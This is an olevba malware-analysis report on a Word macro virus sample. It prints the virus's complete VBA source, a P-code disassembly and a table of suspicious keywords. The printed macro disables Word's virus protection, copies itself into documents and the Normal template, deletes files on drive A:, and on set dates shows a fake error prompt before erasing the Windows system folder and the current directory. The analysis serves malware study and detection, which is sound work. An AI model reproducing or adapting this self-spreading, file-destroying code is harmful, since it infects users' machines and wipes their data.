olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Assilem.i
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO QNC.cls 
in file: ./Virus.MSWord.Assilem.i - OLE stream: 'Macros/VBA/QNC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'########## QNC in TaiWan 2000.1.1 #############
On Error Resume Next
With ActiveDocument
    .ReadOnlyRecommended = False
End With
With Options
    .BackgroundSave = True
    .AllowFastSave = True
    .SavePropertiesPrompt = False
    .SaveInterval = 1
    .SaveNormalPrompt = False
    .VirusProtection = False
End With
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 2
If ADI1.Name <> "QNC" Then
     If ADCL > 0 Then ADI1.CodeModule.DeleteLines 1, ADCL
     Set ToInfect = ADI1
     ADI1.Name = "QNC"
     DoAD = True
End If
If NTI1.Name <> "QNC" Then
     If NTCL > 0 Then NTI1.CodeModule.DeleteLines 1, NTCL
     Set ToInfect = NTI1
     NTI1.Name = "QNC"
     DoNT = True
End If
If DoNT <> True And DoAD <> True Then GoTo CYA
     If DoNT = True Then
          Do While ADI1.CodeModule.Lines(1, 1) = ""
               ADI1.CodeModule.DeleteLines 1
          Loop
          ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
          Do While ADI1.CodeModule.Lines(BGN, 1) <> ""
               ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
               BGN = BGN + 1
          Loop
     End If
If DoAD = True Then
      Do While NTI1.CodeModule.Lines(1, 1) = ""
           NTI1.CodeModule.DeleteLines 1
      Loop
      ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
      Do While NTI1.CodeModule.Lines(BGN, 1) <> ""
           ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
           BGN = BGN + 1
      Loop
End If
If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
     ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
     ActiveDocument.Saved = True
End If
CYA:
If CInt(Hour(Now)) >= 17 And CInt(Hour(Now)) <= 23 Then
   On Error Resume Next
   Kill "a:\*.*"
End If
m = CInt(Month(Now))
d = CInt(Day(Now))
If (d = 13) And (m Mod 4 = 0) Then
   On Error Resume Next
   If MsgBox("Fatal Error！Power Off Your Computer Now！！", vbCritical + vbOKCancel, "쒸멩！") = vbCancel Then
     Dim filestring As String
     Dim Dir1, FF
     Dir1 = "c:\windows\system\"
     FF = Dir(Dir1 & "*.*", vbArchive Or vbHidden Or vbSystem Or vbDirectory)
     Do
      If (GetAttr(Dir1 & FF) And vbDirectory) <> vbDirectory Then
       If GetAttr(Dir1 & FF) = vbReadOnly Or vbSystem Or vbHide Then
          SetAttr Dir1 & FF, vbNormal
       End If
       Kill Dir1 & FF
      End If
      FF = Dir
     Loop Until FF = ""
   End If
   Dir1 = CurDir()
   If Right(Dir1, 1) <> "\" Then Dir1 = Dir1 & "\"
   Kill Dir1 & "*.*"
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Assilem.i
' ===============================================================================
' Module streams:
' Macros/VBA/QNC - 8760 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	QuoteRem 0x0000 0x002F "########## QNC in TaiWan 2000.1.1 #############"
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #4:
' 	LitVarSpecial (False)
' 	MemStWith ReadOnlyRecommended 
' Line #5:
' 	EndWith 
' Line #6:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #7:
' 	LitVarSpecial (True)
' 	MemStWith BackgroundSave 
' Line #8:
' 	LitVarSpecial (True)
' 	MemStWith AllowFastSave 
' Line #9:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' Line #10:
' 	LitDI2 0x0001 
' 	MemStWith SaveInterval 
' Line #11:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #12:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #13:
' 	EndWith 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ADI1 
' Line #15:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NTI1 
' Line #16:
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NTCL 
' Line #17:
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ADCL 
' Line #18:
' 	LitDI2 0x0002 
' 	St BGN 
' Line #19:
' 	Ld ADI1 
' 	MemLd New 
' 	LitStr 0x0003 "QNC"
' 	Ne 
' 	IfBlock 
' Line #20:
' 	Ld ADCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld ADCL 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #21:
' 	SetStmt 
' 	Ld ADI1 
' 	Set ToInfect 
' Line #22:
' 	LitStr 0x0003 "QNC"
' 	Ld ADI1 
' 	MemSt New 
' Line #23:
' 	LitVarSpecial (True)
' 	St DoAD 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	Ld NTI1 
' 	MemLd New 
' 	LitStr 0x0003 "QNC"
' 	Ne 
' 	IfBlock 
' Line #26:
' 	Ld NTCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld NTCL 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #27:
' 	SetStmt 
' 	Ld NTI1 
' 	Set ToInfect 
' Line #28:
' 	LitStr 0x0003 "QNC"
' 	Ld NTI1 
' 	MemSt New 
' Line #29:
' 	LitVarSpecial (True)
' 	St DoNT 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo CYA 
' 	EndIf 
' Line #32:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #33:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #34:
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #35:
' 	Loop 
' Line #36:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Paren 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #37:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #38:
' 	Ld BGN 
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #39:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Add 
' 	St BGN 
' Line #40:
' 	Loop 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #43:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #44:
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #45:
' 	Loop 
' Line #46:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Paren 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #47:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #48:
' 	Ld BGN 
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #49:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Add 
' 	St BGN 
' Line #50:
' 	Loop 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	Ld NTCL 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld ADCL 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #53:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #54:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #55:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	Label CYA 
' Line #58:
' 	Ld Now 
' 	ArgsLd Hour 0x0001 
' 	Coerce (Int) 
' 	LitDI2 0x0011 
' 	Ge 
' 	Ld Now 
' 	ArgsLd Hour 0x0001 
' 	Coerce (Int) 
' 	LitDI2 0x0017 
' 	Le 
' 	And 
' 	IfBlock 
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' 	LitStr 0x0006 "a:\*.*"
' 	ArgsCall Kill 0x0001 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	Coerce (Int) 
' 	St m 
' Line #63:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Coerce (Int) 
' 	St d 
' Line #64:
' 	Ld d 
' 	LitDI2 0x000D 
' 	Eq 
' 	Paren 
' 	Ld m 
' 	LitDI2 0x0004 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #65:
' 	OnError (Resume Next) 
' Line #66:
' 	LitStr 0x002C "Fatal Error！Power Off Your Computer Now！！"
' 	Ld vbCritical 
' 	Ld vbOKCancel 
' 	Add 
' 	LitStr 0x0006 "쒸멩！"
' 	ArgsLd MsgBox 0x0003 
' 	Ld vbCancel 
' 	Eq 
' 	IfBlock 
' Line #67:
' 	Dim 
' 	VarDefn filestring (As String)
' Line #68:
' 	Dim 
' 	VarDefn Dir1
' 	VarDefn FF
' Line #69:
' 	LitStr 0x0012 "c:\windows\system\"
' 	St Dir1 
' Line #70:
' 	Ld Dir1 
' 	LitStr 0x0003 "*.*"
' 	Concat 
' 	Ld vbArchive 
' 	Ld vbHidden 
' 	Or 
' 	Ld vbSystem 
' 	Or 
' 	Ld vbDirectory 
' 	Or 
' 	ArgsLd Dir 0x0002 
' 	St FF 
' Line #71:
' 	Do 
' Line #72:
' 	Ld Dir1 
' 	Ld FF 
' 	Concat 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbDirectory 
' 	And 
' 	Paren 
' 	Ld vbDirectory 
' 	Ne 
' 	IfBlock 
' Line #73:
' 	Ld Dir1 
' 	Ld FF 
' 	Concat 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	Eq 
' 	Ld vbSystem 
' 	Or 
' 	Ld vbHide 
' 	Or 
' 	IfBlock 
' Line #74:
' 	Ld Dir1 
' 	Ld FF 
' 	Concat 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	Ld Dir1 
' 	Ld FF 
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	Ld Dir 
' 	St FF 
' Line #79:
' 	Ld FF 
' 	LitStr 0x0000 ""
' 	Eq 
' 	LoopUntil 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	ArgsLd CurDir 0x0000 
' 	St Dir1 
' Line #82:
' 	Ld Dir1 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0001 "\"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Dir1 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St Dir1 
' 	EndIf 
' Line #83:
' 	Ld Dir1 
' 	LitStr 0x0003 "*.*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

